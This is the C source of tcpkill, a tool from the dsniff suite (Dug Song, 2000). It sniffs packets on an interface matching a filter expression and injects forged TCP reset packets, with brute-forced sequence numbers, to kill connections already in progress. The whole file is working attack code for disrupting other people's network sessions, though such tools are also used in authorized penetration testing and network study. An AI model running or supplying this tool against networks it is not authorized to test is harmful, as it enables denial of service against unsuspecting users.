/*
  tcpkill.c

  Kill TCP connections already in progress.

  Copyright (c) 2000 Dug Song <dugsong@monkey.org>

  $Id: tcpkill.c,v 1.15 2000/11/30 00:39:05 dugsong Exp $
*/

#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <err.h>
#include <libnet.h>
#include <pcap.h>
#include "pcaputil.h"

/* XXX - brute force seqnum space. ugh. */
#define DEFAULT_SEVERITY	3

/* Globals. */
int	Opt_severity = DEFAULT_SEVERITY;
int	pcap_off;

void
usage(void)
{
	fprintf(stderr, "Usage: tcpkill [-i interface] [-1..9] expression\n");
	exit(1);
}

/*
  XXX - we ought to determine the rate of seqnum consumption and
  predict the correct seqnum to use, instead of brute force. i suk.
*/
void
pcap_cb(u_char *user, const struct pcap_pkthdr *pkthdr, const u_char *pkt)
{
	struct libnet_ipv4_hdr *ip;
	struct libnet_tcp_hdr *tcp;
	u_int32_t seq, ack;
	libnet_t *l;
	u_short win;
	int i;

	l = (libnet_t *)user;

	libnet_seed_prand(l);

	ip = (struct libnet_ipv4_hdr *)(pkt + pcap_off);
	if (ip->ip_p != IPPROTO_TCP)
		return;

	tcp = (struct libnet_tcp_hdr *)((u_char*)ip + (ip->ip_hl * 4));
	if (tcp->th_flags & (TH_SYN|TH_FIN|TH_RST))
		return;

	ack = ntohl(tcp->th_ack);
	win = ntohs(tcp->th_win);

	for (i = 0; i < Opt_severity; i++) {
		seq = ack + (i * win);

		libnet_clear_packet(l);

		/* Bulid TCP header*/
		libnet_build_tcp(ntohs(tcp->th_dport),
				 ntohs(tcp->th_sport), seq, 0, TH_RST,
				 0, 0, 0, LIBNET_TCP_H, NULL, 0, l, 0);

		/* Bulid IP header*/
		libnet_build_ipv4(LIBNET_TCP_H + LIBNET_IPV4_H, 0,
				  libnet_get_prand(LIBNET_PRu16), 0,
				  64, IPPROTO_TCP, 0,
				  ip->ip_dst.s_addr, ip->ip_src.s_addr,
				  NULL, 0, l, 0);

		if (libnet_write(l) < 0)
			warn("write_ip");

		fprintf(stderr, "%s:%d > %s:%d: R %u:%u(0) win 0\n",
			libnet_addr2name4(ip->ip_src.s_addr, 0),
			ntohs(tcp->th_sport),
			libnet_addr2name4(ip->ip_dst.s_addr, 0),
			ntohs(tcp->th_dport), seq, seq);
	}
}

int
main(int argc, char *argv[])
{
	int c;
	char *p, *intf, *filter, ebuf[PCAP_ERRBUF_SIZE];
	libnet_t* l;
	pcap_t *pd;

	intf = NULL;

	while ((c = getopt(argc, argv, "i:123456789h?V")) != -1) {
		switch (c) {
		case 'i':
			intf = optarg;
			break;
		case '0': case '1': case '2': case '3': case '4':
		case '5': case '6': case '7': case '8': case '9':
			p = argv[optind - 1];
			if (p[0] == '-' && p[1] == c && p[2] == '\0')
				Opt_severity = atoi(++p);
			else
				Opt_severity = atoi(argv[optind] + 1);
			break;
		default:
			usage();
			break;
		}
	}
	if (intf == NULL && (intf = pcap_lookupdev(ebuf)) == NULL)
		errx(1, "%s", ebuf);

	argc -= optind;
	argv += optind;

	if (argc == 0)
		usage();

	filter = copy_argv(argv);

	if ((pd = pcap_init(intf, filter, 128)) == NULL)
		errx(1, "couldn't initialize sniffing");

	if ((pcap_off = pcap_dloff(pd)) < 0)
		errx(1, "couldn't determine link layer offset");

	if ((l = libnet_init(LIBNET_RAW4, NULL, ebuf)) == NULL)
		errx(1, "couldn't initialize libnet");

	warnx("listening on %s [%s]", intf, filter);

	pcap_loop(pd, -1, pcap_cb, (u_char *)l);

	/* NOTREACHED */

	exit(0);
}
